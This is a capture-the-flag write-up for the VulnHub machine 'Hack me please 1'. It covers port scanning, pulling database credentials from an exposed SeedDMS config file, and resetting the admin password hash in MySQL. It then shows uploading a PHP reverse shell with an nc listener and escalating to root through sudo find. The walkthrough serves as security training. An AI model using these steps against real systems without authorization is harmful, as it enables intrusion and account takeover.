---
{"dg-publish":true,"permalink":"/write-ups/vuln-hub/hack-me-please-1/","tags":["CTF","write-up","Sensitive_data_exposure","sudo-l","RCE"]}
---


![Pasted image 20241210090634.png](/img/user/attachments/Pasted%20image%2020241210090634.png)

---
> [!INFO] Info about Hack me please - 1
>  Difficulty: Easy
>  
>  Description: An easy box totally made for OSCP. No bruteforce is required.
>  
>  Aim: To get root shell

> [!FAQ]- Hints
> **Operating System**: Linux

---
# Active reconnaissance
## Port scan
Executing a fast general scan to all ports.
```shell
sudo nmap TARGET_IP -n -p- -sS -Pn -vvv --open --min-rate 5000 -oN nmap_scan
```

```c
PORT      STATE SERVICE REASON
80/tcp    open  http    syn-ack ttl 64
3306/tcp  open  mysql   syn-ack ttl 64
33060/tcp open  mysqlx  syn-ack ttl 64
```

---
# Enumeration
Executing a deep scan with common scripts only to ports that we are interested.
```shell
sudo nmap TARGET_IP -sCV -p 22,80 -oN nmap_enum
```
## OS
Linux, ubuntu
## Port 3306 - MySQL
06/tcp  open  mysql   **MySQL 8.0.25**-0ubuntu0.20.04.1
| ssl-cert: Subject: commonName=MySQL_Server_8.0.25_Auto_Generated_Server_Certificate
| Not valid before: 2021-07-03T00:33:15
Not valid after:  2031-07-01T00:33:15
| mysql-info:
|   Protocol: 10
|   Version: 8.0.25-0ubuntu0.20.04.1
|   Thread ID: 38
|   Capabilities flags: 65535
|   **Some Capabilities**: SupportsCompression, Speaks41ProtocolNew, SwitchToSSLAfterHandshake, Support41Auth, LongColumnFlag, Speaks41ProtocolOld, ODBCClient, InteractiveClient, IgnoreSigpipes, IgnoreSpaceBeforeParenthesis, SupportsLoadDataLocal, LongPassword, DontAllowDatabaseTableColumn, FoundRows, SupportsTransactions, ConnectWithDatabase, SupportsMultipleResults, SupportsMultipleStatments, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x1EBx\x0E"
| X\x14\x0C\x06B^H&4*%J\x0F
|_  Auth Plugin Name: caching_sha2_password
|ssl-date: TLS randomness does not represent time
## Port 33060 - MySQLX
fingerprint-strings:
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp:
|     Invalid message"
|     HY000
|   LDAPBindReq:
Parse error unserializing protobuf message"
|     HY000
|   oracle-tns:
|     Invalid message-frame."
|_    HY000
## Port 80 - Apache
80/tcp    open  http    Apache httpd **2.4.41** ((Ubuntu))
Add the IP to  */etc/hosts*
```shell
sudo echo "192.168.122.99 hackmeplease.vh" | sudo tee -a /etc/hosts
```
![Pasted image 20241210120145.png](/img/user/attachments/Pasted%20image%2020241210120145.png)
Exploring the webpage I found a server to handle documents named *SeedDMS*
![Pasted image 20241210201410.png](/img/user/attachments/Pasted%20image%2020241210201410.png)

---
# Exploitation
## Apache
### Sensitive Data Exposure
Searching information about *SeedDMS* on the github or gitlab page.
![Pasted image 20241210201719.png](/img/user/attachments/Pasted%20image%2020241210201719.png)
The config info like credentials are stored on */conf/settings.xml*
![Pasted image 20241210201825.png](/img/user/attachments/Pasted%20image%2020241210201825.png)
Therefore, I'll try to reach and check this file in the machine. I used *BurpSuite*
The file exists and content the database credentials. In this case, we know that a *MySQL* server is running, so I assume the credentials are of it.
```
http://hackmeplease.vh/seeddms51x/conf/settings.xml
```

![Pasted image 20241210202321.png](/img/user/attachments/Pasted%20image%2020241210202321.png)
## MySQL
Connect
```shell
mysql -u seeddms -h 192.168.122.99 -p
```

```shell
show databases;
use seeddms;
show tables;
```

```shell
select * from users;
```
I found credentials, but these are not of the login page.
![Pasted image 20241210214845.png](/img/user/attachments/Pasted%20image%2020241210214845.png)

The *tblUsers* contain the credentials.
```shell
select * from tblUsers;
```
![Pasted image 20241210215029.png](/img/user/attachments/Pasted%20image%2020241210215029.png)
 I didn't crack it, but I change it.
 
First I generate the *MD5* hash
```shell
echo -n "admin" | md5sum
```
![Pasted image 20241210214555.png](/img/user/attachments/Pasted%20image%2020241210214555.png)

Now update the hash
```shell
update tblUsers set pwd="21232f297a57a5a743894a0e4a801fc3" where id=1;
```
![Pasted image 20241210214617.png](/img/user/attachments/Pasted%20image%2020241210214617.png)

The password was changed
![Pasted image 20241210215250.png](/img/user/attachments/Pasted%20image%2020241210215250.png)
## SeedDMS RCE
Login with *admin:admin* credentials
![Pasted image 20241210220104.png|500](/img/user/attachments/Pasted%20image%2020241210220104.png)
![Pasted image 20241210220132.png](/img/user/attachments/Pasted%20image%2020241210220132.png)

*searchsploit* show a vulnerability that I can try, although the version doesn't math.
![Pasted image 20241210235105.png](/img/user/attachments/Pasted%20image%2020241210235105.png)
The instructions:
![Pasted image 20241210235149.png](/img/user/attachments/Pasted%20image%2020241210235149.png)
1. In the admin panel, add a document
   ![Pasted image 20241210235304.png](/img/user/attachments/Pasted%20image%2020241210235304.png)
2. Upload a PHP reverse shell (in this case, the *kali* resource */usr/share/webshells/php/php-reverse-shell.php*)
   ![Pasted image 20241210235517.png](/img/user/attachments/Pasted%20image%2020241210235517.png)
3. Open the document on the panel to check the information about versions
   ![Pasted image 20241210235643.png](/img/user/attachments/Pasted%20image%2020241210235643.png)
4. Start the listener
   ```shell
rlwrap nc -lnvp 4747
   ```
5. Go to the *url*
   ```shell
http://hackmeplease.vh/seeddms51x/data/1048576/5/1.php
   ```

Now we got a shell on the listener
![Pasted image 20241211000401.png](/img/user/attachments/Pasted%20image%2020241211000401.png)

---
# Privilege escalation
## Get saket shell
Check interesting users
```shell
 cat /etc/passwd | grep ash
 ```
 ![Pasted image 20241211001750.png](/img/user/attachments/Pasted%20image%2020241211001750.png)

The user *saket* exists, try the credentials found from *mysql* and works
```shell
su saket
```
![Pasted image 20241211001946.png](/img/user/attachments/Pasted%20image%2020241211001946.png)
## Get root shell
Check *sudo -l* permissions
```shell
sudo -l
```
I can run *ALL* command as the *root* user
![Pasted image 20241211002107.png](/img/user/attachments/Pasted%20image%2020241211002107.png)

I try to escalate with *find* command
```shell
sudo find / etc/passwd -exec /bin/bash \;
```
It works and we are root
![Pasted image 20241211002231.png](/img/user/attachments/Pasted%20image%2020241211002231.png)

---
